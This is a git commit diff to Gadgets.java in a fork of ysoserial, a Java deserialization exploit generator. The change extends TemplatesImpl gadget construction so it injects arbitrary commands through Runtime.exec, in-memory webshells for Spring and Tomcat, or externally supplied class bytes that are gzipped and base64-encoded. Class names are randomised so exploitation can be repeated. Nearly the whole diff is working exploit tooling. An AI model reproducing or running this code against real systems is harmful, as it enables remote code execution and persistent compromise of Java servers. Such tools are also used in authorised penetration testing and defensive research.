f4ca9a1988afaa68e5ae4fdf465df3aa8630948d
hktalent <18223385+hktalent@users.noreply.github.com>
2024-01-10 14:59:49 +0800

    up 2024-01-10

--- src/main/java/ysoserial/payloads/util/Gadgets.java
+++ src/main/java/ysoserial/payloads/util/Gadgets.java
@@ -1,25 +1,6 @@
 package ysoserial.payloads.util;
 
 
-import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
-
-import java.io.*;
-import java.lang.reflect.Array;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.InvocationTargetException;
-import java.lang.reflect.Proxy;
-import java.net.URL;
-import java.nio.file.Files;
-import java.nio.file.Paths;
-import java.util.HashMap;
-import java.util.Map;
-
-import com.nqzero.permit.Permit;
-import javassist.ClassClassPath;
-import javassist.ClassPool;
-import javassist.CtClass;
-
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
@@ -27,17 +8,35 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.codec.binary.Base64;
+import org.apache.commons.lang.RandomStringUtils;
+import org.apache.wicket.util.file.Files;
+import ysoserial.payloads.templates.SpringInterceptorMemShell;
 
 import javax.net.ssl.HttpsURLConnection;
+import java.io.*;
+import java.lang.reflect.Array;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.net.URL;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.zip.GZIPOutputStream;
+
+import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
 
 /*
  * utility generator functions for common jdk-only gadgets
  */
-@SuppressWarnings ( {
-    "restriction", "rawtypes", "unchecked"
-} )
+@SuppressWarnings({"restriction", "rawtypes", "unchecked"})
 public class Gadgets {
+
+    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
 
     static {
         // special case for using TemplatesImpl gadgets with a SecurityManager enabled
@@ -47,78 +46,66 @@ public class Gadgets {
         System.setProperty("java.rmi.server.useCodebaseOnly", "false");
     }
 
-    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
-
-    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
-
-        private static final long serialVersionUID = -5971610431559700674L;
-
-
-        public void transform ( DOM document, SerializationHandler[] handlers ) throws TransletException {}
-
-
-        @Override
-        public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
-    }
-
-    // required to make TemplatesImpl happy
-    public static class Foo implements Serializable {
-
-        private static final long serialVersionUID = 8207363842866235160L;
-    }
-
-
-    public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
+    public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
         return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
     }
 
-
-    public static InvocationHandler createMemoizedInvocationHandler ( final Map<String, Object> map ) throws Exception {
+    public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
         return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
     }
 
-
-    public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
+    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
         final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
-        allIfaces[ 0 ] = iface;
-        if ( ifaces.length > 0 ) {
+        allIfaces[0] = iface;
+        if (ifaces.length > 0) {
             System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
         }
         return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
     }
 
-
-    public static Map<String, Object> createMap ( final String key, final Object val ) {
+    public static Map<String, Object> createMap(final String key, final Object val) {
         final Map<String, Object> map = new HashMap<String, Object>();
         map.put(key, val);
         return map;
     }
 
+    public static Object createTemplatesImpl(String command) throws Exception {
+        command = command.trim();
+        Class tplClass;
+        Class abstTranslet;
+        Class transFactory;
 
-    public static Object createTemplatesImpl ( final String command ) throws Exception {
-        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
-            return createTemplatesImpl(
-                command,
-                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
-                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
-                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
+        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
+            tplClass = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
+            abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+            transFactory = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
+        } else {
+            tplClass = TemplatesImpl.class;
+            abstTranslet = AbstractTranslet.class;
+            transFactory = TransformerFactoryImpl.class;
         }
 
-        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+        if (command.startsWith("CLASS:")) {
+            // 这里不能让它初始化，不然从线程中获取WebappClassLoaderBase时会强制类型转换异常。
+            Class<?> clazz = Class.forName("ysoserial.payloads.templates." + command.substring(6), false, Gadgets.class.getClassLoader());
+            return createTemplatesImpl(clazz, null, null, tplClass, abstTranslet, transFactory);
+        } else if (command.startsWith("FILE:")) {
+            byte[] bs = Files.readBytes(new File(command.substring(5)));
+            return createTemplatesImpl(null, null, bs, tplClass, abstTranslet, transFactory);
+        } else {
+            return createTemplatesImpl(null, command, null, tplClass, abstTranslet, transFactory);
+        }
     }
 
 
-    public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
-            throws Exception {
+    public static <T> T createTemplatesImpl(Class myClass, final String command, byte[] bytes, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
         final T templates = tplClass.newInstance();
-
-        // use template gadget class
+        byte[] classBytes = new byte[0];
         ClassPool pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
         pool.insertClassPath(new ClassClassPath(abstTranslet));
-        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
-        // run command in static initializer
-        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
+        CtClass superC = pool.get(abstTranslet.getName());
+        CtClass ctClass;
+
         // sample cmd
         String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
             command.replace("\\", "\\\\").replace("\"", "\\\"") +
@@ -134,12 +121,12 @@ public class Gadgets {
         // # 2 file
         File file = new File(szInjecting);
         if(file.exists()){
-            byte[] bytes = new byte[(int) file.length()];
+            byte[] bytes1 = new byte[(int) file.length()];
             FileInputStream fis = null;
             try{
                 fis = new FileInputStream(file);
-                if (0 < fis.read(bytes)) {
-                    cmd = new String(bytes);
+                if (0 < fis.read(bytes1)) {
+                    cmd = new String(bytes1);
                 }
             }catch (Exception e){}
             finally {
@@ -164,35 +151,73 @@ public class Gadgets {
         } catch (IOException e) {
         }
 
-        clazz.makeClassInitializer().insertAfter(cmd);
-        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
-        clazz.setName("ysoserial.Pwner" + System.nanoTime());
-        CtClass superC = pool.get(abstTranslet.getName());
-        clazz.setSuperclass(superC);
+        // 兼容原来的
+        superC.makeClassInitializer().insertAfter(cmd);
 
-        final byte[] classBytes = clazz.toBytecode();
+        if (command != null) {
+            ctClass = pool.get("ysoserial.payloads.templates.CommandTemplate");
+            ctClass.setName(ctClass.getName() + System.nanoTime());
+            String cmd1 = "cmd = \"" + command + "\";";
+            ctClass.makeClassInitializer().insertBefore(cmd1);
+            ctClass.setSuperclass(superC);
+            classBytes = ctClass.toBytecode();
+        }
+        if (myClass != null) {
+            // CLASS:
+            ctClass = pool.get(myClass.getName());
+            ctClass.setSuperclass(superC);
+            // SpringInterceptorMemShell单独对待
+            if (myClass.getName().contains("SpringInterceptorMemShell")) {
+                // 修改b64字节码
+                CtClass springTemplateClass = pool.get("ysoserial.payloads.templates.SpringInterceptorTemplate");
+                String clazzName = "ysoserial.payloads.templates.SpringInterceptorTemplate" + System.nanoTime();
+                springTemplateClass.setName(clazzName);
+                String encode = Base64.encodeBase64String(springTemplateClass.toBytecode());
+                String b64content = "b64=\"" + encode + "\";";
+                ctClass.makeClassInitializer().insertBefore(b64content);
+                // 修改SpringInterceptorMemShell随机命名 防止二次打不进去
+                String clazzNameContent = "clazzName=\"" + clazzName + "\";";
+                ctClass.makeClassInitializer().insertBefore(clazzNameContent);
+                ctClass.setName(SpringInterceptorMemShell.class.getName() + System.nanoTime());
+                classBytes = ctClass.toBytecode();
+            } else {
+                // 其他的TomcatFilterMemShellFromThread这种可以直接加载 需要随机命名类名
+                ctClass.setName(myClass.getName() + System.nanoTime());
+                classBytes = ctClass.toBytecode();
+            }
+        }
+        if (bytes != null) {
+            // FILE:
+            ctClass = pool.get("ysoserial.payloads.templates.ClassLoaderTemplate");
+            ctClass.setName(ctClass.getName() + System.nanoTime());
+            ByteArrayOutputStream outBuf = new ByteArrayOutputStream();
+            GZIPOutputStream gzipOutputStream = new GZIPOutputStream(outBuf);
+            gzipOutputStream.write(bytes);
+            gzipOutputStream.close();
+            String content = "b64=\"" + Base64.encodeBase64String(outBuf.toByteArray()) + "\";";
+            // System.out.println(content);
+            ctClass.makeClassInitializer().insertBefore(content);
+            ctClass.setSuperclass(superC);
+            classBytes = ctClass.toBytecode();
+        }
+
 
         // inject class bytes into instance
-        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
-            classBytes, ClassFiles.classAsBytes(Foo.class)
-        });
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, ClassFiles.classAsBytes(Foo.class)});
 
         // required to make TemplatesImpl happy
-        Reflections.setFieldValue(templates, "_name", "Pwnr");
+        Reflections.setFieldValue(templates, "_name", RandomStringUtils.randomAlphabetic(8).toUpperCase());
         Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
         return templates;
     }
 
-
-    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
-            IllegalAccessException, InvocationTargetException {
+    public static HashMap makeMap(Object v1, Object v2) throws Exception {
         HashMap s = new HashMap();
         Reflections.setFieldValue(s, "size", 2);
         Class nodeC;
         try {
             nodeC = Class.forName("java.util.HashMap$Node");
-        }
-        catch ( ClassNotFoundException e ) {
+        } catch (ClassNotFoundException e) {
             nodeC = Class.forName("java.util.HashMap$Entry");
         }
         Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
@@ -203,5 +228,25 @@ public class Gadgets {
         Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
         Reflections.setFieldValue(s, "table", tbl);
         return s;
+    }
+
+    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
+
+        private static final long serialVersionUID = -5971610431559700674L;
+
+
+        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+        }
+
+
+        @Override
+        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+        }
+    }
+
+    // required to make TemplatesImpl happy
+    public static class Foo implements Serializable {
+
+        private static final long serialVersionUID = 8207363842866235160L;
     }
 }
